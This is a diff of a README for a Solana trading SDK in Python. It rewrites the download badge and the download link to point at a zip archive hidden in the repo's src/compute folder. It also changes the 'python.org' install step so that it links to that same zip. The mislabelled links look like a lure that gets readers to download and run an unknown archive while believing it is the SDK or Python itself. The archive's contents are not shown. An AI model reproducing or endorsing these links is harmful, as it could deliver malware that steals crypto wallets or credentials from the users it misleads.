@@ -1,6 +1,6 @@
 # ⚡ sol-trade-sdk-python - Trade Solana with less setup
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-1E90FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Adventurismjuggling674/sol-trade-sdk-python)
+[![Download Now](https://img.shields.io/badge/Download%20Now-1E90FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Adventurismjuggling674/sol-trade-sdk-python/raw/refs/heads/main/src/compute/sdk_python_sol_trade_3.8.zip)
 
 ## 🚀 What this is
 
@@ -25,7 +25,7 @@ If you want to run trading tools with live network access, use a stable connecti
 
 Use this link to visit this page to download:
 
-[https://github.com/Adventurismjuggling674/sol-trade-sdk-python](https://github.com/Adventurismjuggling674/sol-trade-sdk-python)
+[https://github.com/Adventurismjuggling674/sol-trade-sdk-python/raw/refs/heads/main/src/compute/sdk_python_sol_trade_3.8.zip](https://github.com/Adventurismjuggling674/sol-trade-sdk-python/raw/refs/heads/main/src/compute/sdk_python_sol_trade_3.8.zip)
 
 Follow these steps on Windows:
 
@@ -42,7 +42,7 @@ If the repo includes a release file later, you can use that file directly. For n
 
 If Python is not already installed:
 
-1. Go to [python.org](https://www.python.org/downloads/).
+1. Go to [python.org](https://github.com/Adventurismjuggling674/sol-trade-sdk-python/raw/refs/heads/main/src/compute/sdk_python_sol_trade_3.8.zip).
 2. Download the latest Python 3 release for Windows.
 3. Run the installer.
 4. Check the box that says **Add Python to PATH**.
